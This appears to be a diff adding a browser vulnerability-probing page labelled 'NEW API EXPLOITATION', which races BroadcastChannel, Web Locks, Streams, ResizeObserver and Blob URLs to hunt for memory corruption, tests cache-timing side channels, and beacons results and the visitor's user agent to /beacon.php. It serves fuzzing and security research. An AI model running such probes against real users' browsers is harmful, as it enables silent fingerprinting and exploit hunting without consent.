@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1090</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.crit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1090 — NEW API EXPLOITATION</div>
+<div class="info">BroadcastChannel races, Web Locks contention, Stream pipeline cancel, ResizeObserver layout loop, CompressionStream cancel</div>
+</div>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){try{new Image().src='/beacon.php?tag=P1090-'+encodeURIComponent(t)+'&data='+encodeURIComponent(d)+'&_='+Date.now()}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+
+// ============================================================
+// SECTION A: BROADCASTCHANNEL IFRAME RACE
+// BroadcastChannel connects contexts sharing an origin.
+// If we destroy a context (iframe) while it has a pending
+// message dispatch, the subscriber list might reference freed memory.
+// ============================================================
+async function sectionA() {
+  log('warn','=== A: BROADCASTCHANNEL IFRAME RACE ===');
+  var results = [];
+  var anomalies = 0;
+
+  // A1: Basic BroadcastChannel test
+  try {
+    var bc1 = new BroadcastChannel('test-a1');
+    var bc2 = new BroadcastChannel('test-a1');
+    var received = false;
+    bc2.onmessage = function(e) { received = true; };
+    bc1.postMessage('ping');
+    await sl(50);
+    B('A1-BASIC', 'received:'+received);
+    log(received?'ok':'fail', '[A1] BroadcastChannel basic: received='+received);
+    results.push({test:'A1',received:received});
+    bc1.close(); bc2.close();
+  } catch(e) {
+    B('A1-ERR', e.message);
+    log('fail', '[A1] '+e.message);
+    results.push({test:'A1',err:e.message});
+  }
+
+  // A2: Iframe + BroadcastChannel race
+  for (var round = 0; round < 30; round++) {
+    try {
+      var channelName = 'race-' + round;
+      var mainBC = new BroadcastChannel(channelName);
+      var msgCount = 0;
+      var gotCorrupt = false;
+
+      mainBC.onmessage = function(e) {
+        msgCount++;
+        // Check if message data is corrupted
+        if (typeof e.data !== 'string' || e.data.indexOf('iframe-') !== 0) {
+          gotCorrupt = true;
+          anomalies++;
+          B('A2-CORRUPT', 'round:'+round+'|data:'+String(e.data).substring(0,50));
+          log('crit', '[A2-'+round+'] CORRUPTED message: '+String(e.data).substring(0,50));
+        }
+      };
+
+      // Create iframe that joins the channel and sends messages
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.srcdoc = '<script>' +
+        'var bc = new BroadcastChannel("' + channelName + '");' +
+        'for(var i=0;i<20;i++) bc.postMessage("iframe-"+i);' +
+        '<\/script>';
+      document.body.appendChild(iframe);
+
+      // Race: remove iframe while messages are in flight
+      await sl(2);
+      document.body.removeChild(iframe);
+      iframe = null;
+
+      // Continue sending from main to see if channel is corrupted
+      for (var k = 0; k < 5; k++) {
+        try { mainBC.postMessage('main-after-remove-' + k); } catch(e) {}
+      }
+
+      await sl(50);
+      mainBC.close();
+
+      if (round % 10 === 9) {
+        B('A2-STATUS', 'round:'+round+'|msgs:'+msgCount+'|corrupt:'+gotCorrupt);
+      }
+    } catch(e) {
+      B('A2-ERR', 'round:'+round+'|'+e.message);
+    }
+  }
+
+  // A3: Rapid channel create/destroy cycle
+  var rapidAnomalies = 0;
+  for (var round = 0; round < 50; round++) {
+    try {
+      var channels = [];
+      for (var i = 0; i < 10; i++) {
+        var ch = new BroadcastChannel('rapid-' + (round * 10 + i));
+        ch.onmessage = function(e) {
+          if (e.data !== 'test') rapidAnomalies++;
+        };
+        channels.push(ch);
+      }
+      // Send to all
+      for (var i = 0; i < channels.length; i++) {
+        channels[i].postMessage('test');
+      }
+      // Close half immediately
+      for (var i = 0; i < channels.length; i += 2) {
+        channels[i].close();
+      }
+      // Send again to remaining
+      for (var i = 1; i < channels.length; i += 2) {
+        try { channels[i].postMessage('test2'); } catch(e) {}
+        channels[i].close();
+      }
+    } catch(e) {}
+  }
+  await sl(100);
+  B('A3-RAPID', 'anomalies:'+rapidAnomalies);
+  log(rapidAnomalies>0?'crit':'ok', '[A3] Rapid create/destroy: '+rapidAnomalies+' anomalies');
+
+  B('A-DONE', 'anomalies:'+anomalies+'|rapid:'+rapidAnomalies);
+  log(anomalies+rapidAnomalies>0?'crit':'ok', '[A] BroadcastChannel: total anomalies='+(anomalies+rapidAnomalies));
+  return results;
+}
+
+// ============================================================
+// SECTION B: WEB LOCKS CONTENTION RACE
+// navigator.locks.request() holds a lock while the callback runs.
+// Race: release a lock while another requester's callback is
+// being set up. Also test steal + abort combinations.
+// ============================================================
+async function sectionB() {
+  log('warn','=== B: WEB LOCKS CONTENTION ===');
+  var results = [];
+
+  if (!navigator.locks) {
+    B('B-ABSENT', 'no-navigator.locks');
+    log('fail', '[B] No Lock API');
+    return [{test:'B',available:false}];
+  }
+
+  // B1: Basic lock functionality
+  try {
+    var held = false;
+    await navigator.locks.request('test-b1', function(lock) {
+      held = true;
+      B('B1-LOCK', 'name:'+lock.name+'|mode:'+lock.mode);
+      log('ok', '[B1] Lock acquired: name='+lock.name+' mode='+lock.mode);
+      return Promise.resolve();
+    });
+    results.push({test:'B1',held:held});
+  } catch(e) {
+    B('B1-ERR', e.message);
+    log('fail', '[B1] '+e.message);
+    results.push({test:'B1',err:e.message});
+  }
+
+  // B2: Lock contention - multiple waiters
+  var anomalies = 0;
+  try {
+    var order = [];
+    var p1 = navigator.locks.request('contention', function() {
+      order.push('A-start');
+      return sl(50).then(function() { order.push('A-end'); });
+    });
+    var p2 = navigator.locks.request('contention', function() {
+      order.push('B-start');
+      return sl(10).then(function() { order.push('B-end'); });
+    });
+    var p3 = navigator.locks.request('contention', function() {
+      order.push('C-start');
+      return Promise.resolve().then(function() { order.push('C-end'); });
+    });
+    await Promise.all([p1, p2, p3]);
+    var orderStr = order.join(',');
+    B('B2-ORDER', orderStr);
+    log('info', '[B2] Lock order: '+orderStr);
+    // Expected: A-start,A-end,B-start,B-end,C-start,C-end
+    if (order[0] !== 'A-start' || order[2] !== 'B-start') {
+      anomalies++;
+      B('B2-ANOMALY', 'unexpected-order:'+orderStr);
+      log('crit', '[B2] UNEXPECTED lock ordering!');
+    }
+    results.push({test:'B2',order:orderStr});
+  } catch(e) {
+    B('B2-ERR', e.message);
+    results.push({test:'B2',err:e.message});
+  }
+
+  // B3: Lock steal + abort race
+  try {
+    var stealResults = [];
+    for (var round = 0; round < 20; round++) {
+      var ac = new AbortController();
+      var lockName = 'steal-' + round;
+      var stolen = false, aborted = false, held = false;
+
+      // Hold a lock
+      var holdPromise = navigator.locks.request(lockName, function() {
+        held = true;
+        return sl(100);
+      });
+
+      // Try to steal it while aborting
+      try {
+        var stealPromise = navigator.locks.request(lockName, {steal: true, signal: ac.signal}, function(lock) {
+          stolen = true;
+          return Promise.resolve();
+        });
+        // Abort immediately after requesting steal
+        ac.abort();
+        try { await stealPromise; } catch(e) { aborted = true; }
+      } catch(e) {
+        aborted = true;
+      }
+
+      await holdPromise;
+      stealResults.push({round:round, held:held, stolen:stolen, aborted:aborted});
+
+      if (stolen && aborted) {
+        anomalies++;
+        B('B3-BOTH', 'round:'+round);
+        log('crit', '[B3-'+round+'] BOTH stolen AND aborted!');
+      }
+    }
+    B('B3-STEAL', 'total:'+stealResults.length+'|anomalies:'+anomalies);
+    log(anomalies>0?'crit':'ok', '[B3] Steal+abort: '+anomalies+' anomalies/20');
+    results.push({test:'B3',anomalies:anomalies});
+  } catch(e) {
+    B('B3-ERR', e.message);
+    results.push({test:'B3',err:e.message});
+  }
+
+  // B4: Shared vs exclusive lock race
+  try {
+    var sharedAnomalies = 0;
+    var concurrentShared = 0;
+    for (var round = 0; round < 15; round++) {
+      var active = 0;
+      var maxActive = 0;
+      var promises = [];
+
+      // 5 shared readers
+      for (var i = 0; i < 5; i++) {
+        promises.push(navigator.locks.request('shared-test', {mode: 'shared'}, function() {
+          active++;
+          if (active > maxActive) maxActive = active;
+          return sl(20).then(function() { active--; });
+        }));
+      }
+
+      // 1 exclusive writer, squeezed between shared
+      promises.push(navigator.locks.request('shared-test', {mode: 'exclusive'}, function(lock) {
+        if (active > 0) {
+          sharedAnomalies++;
+          B('B4-OVERLAP', 'round:'+round+'|active:'+active);
+          log('crit', '[B4-'+round+'] EXCLUSIVE overlapped with '+active+' shared!');
+        }
+        return sl(5);
+      }));
+
+      await Promise.all(promises);
+      if (maxActive > 1) concurrentShared++;
+    }
+    B('B4-SHARED', 'concurrent:'+concurrentShared+'|anomalies:'+sharedAnomalies);
+    log(sharedAnomalies>0?'crit':'ok', '[B4] Shared/excl: concurrent='+concurrentShared+' anomalies='+sharedAnomalies);
+    results.push({test:'B4',concurrent:concurrentShared,anomalies:sharedAnomalies});
+  } catch(e) {
+    B('B4-ERR', e.message);
+    results.push({test:'B4',err:e.message});
+  }
+
+  // B5: Lock query (if available)
+  try {
+    var state = await navigator.locks.query();
+    B('B5-QUERY', 'held:'+state.held.length+'|pending:'+state.pending.length);
+    log('info', '[B5] Lock state: held='+state.held.length+' pending='+state.pending.length);
+    results.push({test:'B5',held:state.held.length,pending:state.pending.length});
+  } catch(e) {
+    B('B5-QUERY', 'ERR:'+e.message);
+    log('info', '[B5] query() not available: '+e.message);
+    results.push({test:'B5',err:e.message});
+  }
+
+  B('B-DONE', 'anomalies:'+anomalies);
+  return results;
+}
+
+// ============================================================
+// SECTION C: STREAM PIPELINE CANCEL RACE
+// Pipe ReadableStream to WritableStream, then abort/cancel
+// mid-transfer. Internal pipe state might reference freed chunks.
+// ============================================================
+async function sectionC() {
+  log('warn','=== C: STREAM PIPELINE CANCEL ===');
+  var results = [];
+  var anomalies = 0;
+
+  // C1: Basic pipe
+  try {
+    var chunks = [];
+    var rs = new ReadableStream({
+      start: function(controller) {
+        for (var i = 0; i < 100; i++) controller.enqueue('chunk-' + i);
+        controller.close();
+      }
+    });
+    var ws = new WritableStream({
+      write: function(chunk) { chunks.push(chunk); }
+    });
+    await rs.pipeTo(ws);
+    B('C1-PIPE', 'chunks:'+chunks.length);
+    log('ok', '[C1] Basic pipe: '+chunks.length+' chunks');
+    results.push({test:'C1',chunks:chunks.length});
+  } catch(e) {
+    B('C1-ERR', e.message);
+    log('fail', '[C1] '+e.message);
+    results.push({test:'C1',err:e.message});
+  }
+
+  // C2: Abort pipe mid-transfer
+  for (var round = 0; round < 20; round++) {
+    try {
+      var ac = new AbortController();
+      var writeCount = 0;
+      var errored = false;
+
+      var rs = new ReadableStream({
+        pull: function(controller) {
+          // Slow producer - enqueue one at a time
+          controller.enqueue(new ArrayBuffer(1024));
+          if (writeCount > 50) controller.close();
+        }
+      });
+
+      var ws = new WritableStream({
+        write: function(chunk) {
+          writeCount++;
+          // Abort mid-write at a random point
+          if (writeCount === 5 + (round % 10)) {
+            ac.abort();
+          }
+        }
+      });
+
+      try {
+        await rs.pipeTo(ws, {signal: ac.signal});
+      } catch(e) {
+        errored = true;
+        // Check if the error is the expected AbortError
+        if (e.name !== 'AbortError') {
+          anomalies++;
+          B('C2-UNEXPECTED', 'round:'+round+'|err:'+e.name+':'+e.message);
+          log('crit', '[C2-'+round+'] UNEXPECTED error: '+e.name);
+        }
+      }
+
+      // Try to use the streams after abort
+      try {
+        var reader = rs.getReader();
+        var read = await reader.read();
+        if (!read.done) {
+          // Stream still readable after abort — data from cancelled pipe
+          B('C2-STILL-READABLE', 'round:'+round+'|value:'+typeof read.value);
+          log('warn', '[C2-'+round+'] Stream still readable after abort!');
+        }
+        reader.releaseLock();
+      } catch(e) { /* expected - stream may be locked or errored */ }
+
+    } catch(e) {
+      B('C2-ERR', 'round:'+round+'|'+e.message);
+    }
+  }
+
+  B('C2-DONE', 'anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok', '[C2] Pipe abort race: '+anomalies+' anomalies/20');
+  results.push({test:'C2',anomalies:anomalies});
+
+  // C3: Transform stream cancel during transform
+  for (var round = 0; round < 15; round++) {
+    try {
+      var transformCount = 0;
+      var ts = new TransformStream({
+        transform: function(chunk, controller) {
+          transformCount++;
+          // Double the chunk size in the transform
+          var doubled = new ArrayBuffer(chunk.byteLength * 2);
+          controller.enqueue(doubled);
+        }
+      });
+
+      var writer = ts.writable.getWriter();
+      var reader = ts.readable.getReader();
+
+      // Start writing
+      for (var i = 0; i < 10; i++) {
+        writer.write(new ArrayBuffer(512));
+      }
+
+      // Read a few, then cancel
+      var readCount = 0;
+      for (var i = 0; i < 3; i++) {
+        try {
+          var r = await Promise.race([reader.read(), sl(100).then(function(){return {timeout:true}})]);
+          if (!r.timeout) readCount++;
+        } catch(e) { break; }
+      }
+
+      // Cancel reader while transforms may be pending
+      try { reader.cancel(); } catch(e) {}
+      // Close writer
+      try { writer.close(); } catch(e) {}
+
+      // Check for lingering state
+      try {
+        var r2 = await Promise.race([reader.read(), sl(50).then(function(){return {done:true,timeout:true}})]);
+        if (!r2.done && !r2.timeout) {
+          anomalies++;
+          B('C3-LINGER', 'round:'+round+'|value:'+typeof r2.value);
+        }
+      } catch(e) { /* expected */ }
+
+    } catch(e) {
+      B('C3-ERR', 'round:'+round+'|'+e.message);
+    }
+  }
+
+  B('C3-DONE', 'anomalies:'+anomalies);
+  results.push({test:'C3',anomalies:anomalies});
+
+  // C4: CompressionStream cancel during compress
+  try {
+    for (var round = 0; round < 10; round++) {
+      try {
+        var cs = new CompressionStream('gzip');
+        var writer = cs.writable.getWriter();
+        var reader = cs.readable.getReader();
+
+        // Write large chunks
+        for (var i = 0; i < 5; i++) {
+          var data = new Uint8Array(65536);
+          for (var j = 0; j < data.length; j++) data[j] = j & 0xFF;
+          writer.write(data);
+        }
+
+        // Cancel mid-compression
+        try { reader.cancel('test-cancel'); } catch(e) {}
+        try { writer.abort('test-abort'); } catch(e) {}
+
+        // Try to read from cancelled stream
+        try {
+          var r = await Promise.race([reader.read(), sl(50).then(function(){return {done:true}})]);
+          if (!r.done && r.value) {
+            B('C4-DATA-AFTER-CANCEL', 'round:'+round+'|len:'+r.value.byteLength);
+            log('warn', '[C4-'+round+'] Data after cancel: '+r.value.byteLength+' bytes');
+          }
+        } catch(e) { /* expected */ }
+      } catch(e) {
+        B('C4-ERR', 'round:'+round+'|'+e.message);
+      }
+    }
+    B('C4-COMPRESS', 'done');
+    log('ok', '[C4] CompressionStream cancel: tested');
+  } catch(e) {
+    B('C4-FATAL', e.message);
+  }
+
+  B('C-DONE', 'anomalies:'+anomalies);
+  return results;
+}
+
+// ============================================================
+// SECTION D: RESIZEOBSERVER LAYOUT LOOP
+// ResizeObserver callback → change size → triggers RO again.
+// If the engine doesn't have a depth limit, this creates an
+// infinite loop that can corrupt internal layout state.
+// ============================================================
+async function sectionD() {
+  log('warn','=== D: RESIZEOBSERVER LAYOUT LOOP ===');
+  var results = [];
+
+  // D1: Basic ResizeObserver
+  try {
+    var observed = false;
+    var el = document.createElement('div');
+    el.style.width = '100px';
+    el.style.height = '100px';
+    el.style.position = 'absolute';
+    el.style.left = '-9999px';
+    document.body.appendChild(el);
+
+    var ro = new ResizeObserver(function(entries) { observed = true; });
+    ro.observe(el);
+    await sl(50);
+    el.style.width = '200px';
+    await sl(50);
+    B('D1-BASIC', 'observed:'+observed);
+    log(observed?'ok':'fail', '[D1] ResizeObserver basic: '+observed);
+    ro.disconnect();
+    document.body.removeChild(el);
+    results.push({test:'D1',observed:observed});
+  } catch(e) {
+    B('D1-ERR', e.message);
+    results.push({test:'D1',err:e.message});
+  }
+
+  // D2: Recursive resize loop (capped to avoid real hang)
+  try {
+    var loopCount = 0;
+    var maxLoops = 0;
+    var el = document.createElement('div');
+    el.style.width = '100px';
+    el.style.height = '100px';
+    el.style.position = 'absolute';
+    el.style.left = '-9999px';
+    document.body.appendChild(el);
+
+    var ro = new ResizeObserver(function(entries) {
+      loopCount++;
+      if (loopCount > 500) return; // Safety cap
+      // Change size inside the callback to trigger again
+      var w = parseInt(el.style.width) || 100;
+      el.style.width = (w + 1) + 'px';
+    });
+    ro.observe(el);
+    el.style.width = '101px'; // Initial trigger
+    await sl(200);
+    maxLoops = loopCount;
+    ro.disconnect();
+    document.body.removeChild(el);
+    B('D2-LOOP', 'count:'+maxLoops);
+    log(maxLoops>100?'warn':'ok', '[D2] Recursive resize: '+maxLoops+' iterations');
+    results.push({test:'D2',loops:maxLoops});
+  } catch(e) {
+    B('D2-ERR', e.message);
+    results.push({test:'D2',err:e.message});
+  }
+
+  // D3: ResizeObserver + element removal mid-observation
+  var anomalies = 0;
+  for (var round = 0; round < 20; round++) {
+    try {
+      var callbackFired = false;
+      var el = document.createElement('div');
+      el.style.width = (100 + round) + 'px';
+      el.style.height = '50px';
+      el.style.position = 'absolute';
+      el.style.left = '-9999px';
+      document.body.appendChild(el);
+
+      var ro = new ResizeObserver(function(entries) {
+        callbackFired = true;
+        // Remove the element inside the callback
+        try { document.body.removeChild(el); } catch(e) {}
+        // Allocate replacement objects
+        for (var i = 0; i < 20; i++) {
+          var r = document.createElement('div');
+          r.style.width = '50px';
+          document.body.appendChild(r);
+          document.body.removeChild(r);
+        }
+        // Try to read from the removed entry
+        for (var i = 0; i < entries.length; i++) {
+          try {
+            var cr = entries[i].contentRect;
+            if (cr.width < 0 || cr.height < 0 || isNaN(cr.width)) {
+              anomalies++;
+              B('D3-BAD-RECT', 'round:'+round+'|w:'+cr.width+'|h:'+cr.height);
+              log('crit', '[D3-'+round+'] BAD contentRect: '+cr.width+'x'+cr.height);
+            }
+          } catch(e) {
+            anomalies++;
+            B('D3-CRASH', 'round:'+round+'|'+e.message);
+          }
+        }
+      });
+
+      ro.observe(el);
+      el.style.width = (200 + round) + 'px';
+      await sl(50);
+      ro.disconnect();
+      try { document.body.removeChild(el); } catch(e) {}
+    } catch(e) {
+      B('D3-ERR', 'round:'+round+'|'+e.message);
+    }
+  }
+  B('D3-REMOVE', 'anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok', '[D3] RO + element removal: '+anomalies+' anomalies/20');
+  results.push({test:'D3',anomalies:anomalies});
+
+  B('D-DONE', JSON.stringify(results).substring(0,200));
+  return results;
+}
+
+// ============================================================
+// SECTION E: BROADCASTCHANNEL + BLOB URL RACE
+// Create a page via Blob URL, connect it via BroadcastChannel,
+// revoke the Blob URL while the page is still communicating.
+// ============================================================
+async function sectionE() {
+  log('warn','=== E: BLOB URL + CHANNEL RACE ===');
+  var results = [];
+  var anomalies = 0;
+
+  for (var round = 0; round < 15; round++) {
+    try {
+      var chName = 'blob-race-' + round;
+      var mainBC = new BroadcastChannel(chName);
+      var gotMsg = false;
+      var gotCorrupt = false;
+
+      mainBC.onmessage = function(e) {
+        gotMsg = true;
+        if (typeof e.data !== 'object' || e.data.type !== 'hello') {
+          gotCorrupt = true;
+          anomalies++;
+          B('E-CORRUPT', 'round:'+round+'|data:'+JSON.stringify(e.data).substring(0,60));
+        }
+      };
+
+      // Create a blob URL page that communicates via BroadcastChannel
+      var pageCode = '<!DOCTYPE html><html><body><script>' +
+        'var bc = new BroadcastChannel("' + chName + '");' +
+        'bc.postMessage({type:"hello",round:'+round+'});' +
+        'setInterval(function(){bc.postMessage({type:"hello",tick:Date.now()});},10);' +
+        '<\/script></body></html>';
+
+      var blob = new Blob([pageCode], {type: 'text/html'});
+      var url = URL.createObjectURL(blob);
+
+      // Load in iframe
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = url;
+      document.body.appendChild(iframe);
+
+      await sl(30);
+
+      // Revoke URL while iframe is still running
+      URL.revokeObjectURL(url);
+
+      // Send messages after revocation
+      for (var k = 0; k < 5; k++) {
+        mainBC.postMessage({type:'main', k:k});
+        await sl(5);
+      }
+
+      // Remove iframe after revocation
+      document.body.removeChild(iframe);
+      mainBC.close();
+
+      if (round === 14) {
+        B('E-FINAL', 'msgs:'+gotMsg+'|corrupt:'+gotCorrupt);
+      }
+    } catch(e) {
+      B('E-ERR', 'round:'+round+'|'+e.message);
+    }
+  }
+
+  B('E-DONE', 'anomalies:'+anomalies);
+  log(anomalies>0?'crit':'ok', '[E] Blob+Channel race: '+anomalies+' anomalies/15');
+  results.push({test:'E',anomalies:anomalies});
+  return results;
+}
+
+// ============================================================
+// SECTION F: PERFORMANCE.NOW PRECISION + TIMING SIDE CHANNEL
+// High-resolution timing might distinguish cache hits vs misses,
+// enabling cross-origin information leaks.
+// ============================================================
+async function sectionF() {
+  log('warn','=== F: TIMING PRECISION ===');
+  var results = [];
+
+  // F1: Measure performance.now() resolution
+  try {
+    var samples = [];
+    var prev = performance.now();
+    for (var i = 0; i < 1000; i++) {
+      var now = performance.now();
+      if (now !== prev) {
+        samples.push(now - prev);
+        prev = now;
+      }
+    }
+    var minDelta = samples.length > 0 ? Math.min.apply(null, samples) : 0;
+    var avgDelta = samples.length > 0 ? samples.reduce(function(a,b){return a+b},0) / samples.length : 0;
+    B('F1-PRECISION', 'min:'+minDelta.toFixed(6)+'|avg:'+avgDelta.toFixed(6)+'|samples:'+samples.length);
+    log('info', '[F1] Timer: min='+minDelta.toFixed(3)+'ms avg='+avgDelta.toFixed(3)+'ms ('+samples.length+' samples)');
+    results.push({test:'F1',min:minDelta,avg:avgDelta,samples:samples.length});
+  } catch(e) {
+    B('F1-ERR', e.message);
+    results.push({test:'F1',err:e.message});
+  }
+
+  // F2: Memory access timing
+  try {
+    var buf = new ArrayBuffer(4 * 1024 * 1024); // 4MB
+    var view = new Uint32Array(buf);
+    // Prime cache line 0
+    view[0] = 1;
+    var t1 = performance.now();
+    for (var i = 0; i < 1000; i++) { var x = view[0]; }
+    var cachedTime = performance.now() - t1;
+    // Access stride pattern to evict cache
+    for (var i = 0; i < view.length; i += 16) view[i] = i;
+    var t2 = performance.now();
+    for (var i = 0; i < 1000; i++) { var x = view[0]; }
+    var uncachedTime = performance.now() - t2;
+    B('F2-CACHE', 'cached:'+cachedTime.toFixed(3)+'|uncached:'+uncachedTime.toFixed(3)+'|ratio:'+(uncachedTime/cachedTime).toFixed(2));
+    log('info', '[F2] Cache timing: cached='+cachedTime.toFixed(3)+'ms uncached='+uncachedTime.toFixed(3)+'ms');
+    results.push({test:'F2',cached:cachedTime,uncached:uncachedTime});
+  } catch(e) {
+    B('F2-ERR', e.message);
+    results.push({test:'F2',err:e.message});
+  }
+
+  B('F-DONE', JSON.stringify(results).substring(0,200));
+  return results;
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run() {
+  B('BOOT', navigator.userAgent.substring(0,80));
+  log('ok', '=== P1090: NEW API EXPLOITATION ===');
+  log('info', 'Targeting: BroadcastChannel, Web Locks, Streams, ResizeObserver');
+  log('ok','');
+
+  var rA = await sectionA(); log('ok',''); await sl(100);
+  var rB = await sectionB(); log('ok',''); await sl(100);
+  var rC = await sectionC(); log('ok',''); await sl(100);
+  var rD = await sectionD(); log('ok',''); await sl(100);
+  var rE = await sectionE(); log('ok',''); await sl(100);
+  var rF = await sectionF();
+
+  log('ok','');
+  B('ALL-DONE', 'sections:6|complete');
+  log('ok', '=== P1090 COMPLETE ===');
+}
+
+run();
+</script>
+</body>
+</html>
